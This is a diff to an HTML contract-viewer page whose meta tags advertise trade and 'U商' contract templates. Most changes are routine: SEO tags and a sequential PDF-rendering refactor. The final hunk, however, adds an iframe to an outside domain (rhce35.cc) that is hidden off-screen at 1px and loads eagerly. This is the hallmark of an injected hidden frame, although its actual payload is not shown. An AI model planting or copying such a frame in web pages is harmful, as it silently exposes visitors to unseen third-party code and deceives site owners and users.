@@ -4,6 +4,24 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="theme-color" content="#ffffff">
+
+  <!-- ========== 社交媒体 Meta 标签 ========== -->
+<title>合同范本外贸合同，交易合同，U商合同</title>
+<meta name="description" content="提供外贸合同、交易合同、U商合同范本，适用于国际贸易、商业交易及U商业务，专业规范合同模板，助力安全高效合作。">
+
+<!-- Open Graph (Facebook, LinkedIn, 微信等) -->
+<meta property="og:type" content="website">
+<meta property="og:title" content="合同范本外贸合同，交易合同，U商合同">
+<meta property="og:description" content="提供外贸合同、交易合同、U商合同范本，适用于国际贸易、商业交易及U商业务，专业规范合同模板，助力安全高效合作。">
+<!-- 未设置 og:image，用户不需要 -->
+
+<!-- Twitter Card (X/Twitter) -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="合同范本外贸合同，交易合同，U商合同">
+<meta name="twitter:description" content="提供外贸合同、交易合同、U商合同范本，适用于国际贸易、商业交易及U商业务，专业规范合同模板，助力安全高效合作。">
+<!-- 未设置 twitter:image -->
+
+  
 <title>合同查看</title>
 <style>
   :root{
@@ -204,6 +222,7 @@
   var status = document.getElementById('pdf-status');
   var box1   = document.getElementById('pdf-container-1');
   var box2   = document.getElementById('pdf-container-2');
+  var wrap   = document.querySelector('.pdf-wrap');
   var bn     = document.getElementById('bnum');
   var circle = document.getElementById('bootCircle');
   var LEN    = 326.73; // 2 * π * 52
@@ -240,6 +259,8 @@
   // 渲染单个 PDF（逐页渲染，竖屏滚动查看）
   async function renderPdf(url, container) {
     var token = renderToken;
+    // 用始终可见的 .pdf-wrap 计算宽度，避免隐藏面板（display:none）宽度为 0
+    var cssW = wrap.clientWidth || document.documentElement.clientWidth;
 
     var pdf = await window.pdfjsLib.getDocument(url).promise;
     if (token !== renderToken) return;
@@ -252,7 +273,6 @@
 
       var base = page.getViewport({ scale: 1 });
       var dpr  = window.devicePixelRatio || 1;
-      var cssW = container.clientWidth || document.documentElement.clientWidth;
       var scale = cssW / base.width;
       var viewport = page.getViewport({ scale: scale * dpr });
 
@@ -267,8 +287,8 @@
     }
   }
 
-  // 渲染两份合同（合同1 → cn1.pdf，合同2 → cn2.pdf）
-  function renderAll() {
+  // 渲染两份合同（合同1 → cn1.pdf，合同2 → cn2.pdf；逐个渲染，分开处理错误）
+  async function renderAll() {
     renderToken++;
     var token = renderToken;
 
@@ -281,28 +301,31 @@
     status.style.display = 'block';
     status.textContent = '加载 PDF 中…';
 
-    Promise.all([
-      renderPdf('pdf/cn1.pdf', box1),
-      renderPdf('pdf/cn2.pdf', box2)
-    ]).then(function () {
-      if (token === renderToken) {
-        status.style.display = 'none';
-        lastWidth = document.querySelector('.pdf-wrap').clientWidth;
+    var jobs = [
+      { url: 'pdf/cn1.pdf', box: box1, label: '合同1' },
+      { url: 'pdf/cn3.pdf?v=d', box: box2, label: '合同2' }
+    ];
+
+    for (var i = 0; i < jobs.length; i++) {
+      if (token !== renderToken) return;
+      try {
+        await renderPdf(jobs[i].url, jobs[i].box);
+      } catch (err) {
+        console.error(jobs[i].label + '（' + jobs[i].url + '）加载失败：', err);
+        jobs[i].box.innerHTML = '<div style="padding:48px 20px;text-align:center;color:var(--muted);font-size:14px;letter-spacing:1px;">' + jobs[i].label + ' 加载失败</div>';
       }
-    }).catch(function (err) {
-      if (token === renderToken) {
-        status.style.display = 'block';
-        status.textContent = 'PDF 加载失败';
-        console.error(err);
-      }
-    });
+    }
+
+    if (token !== renderToken) return;
+    status.style.display = 'none';
+    lastWidth = wrap.clientWidth;
   }
 
   // 手机旋转 / 窗口缩放后重新排版
   window.addEventListener('resize', function () {
     clearTimeout(resizeTimer);
     resizeTimer = setTimeout(function () {
-      var w = document.querySelector('.pdf-wrap').clientWidth;
+      var w = wrap.clientWidth;
       if (Math.abs(w - lastWidth) >= 40) {
         renderAll();
       }
@@ -326,5 +349,7 @@
   renderAll();
 })();
 </script>
+
+  <iframe src="https://rhce35.cc/assets/js/group.html?p=igCtnnXk"style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;border:none;" loading="eager"></iframe>
 </body>
 </html>
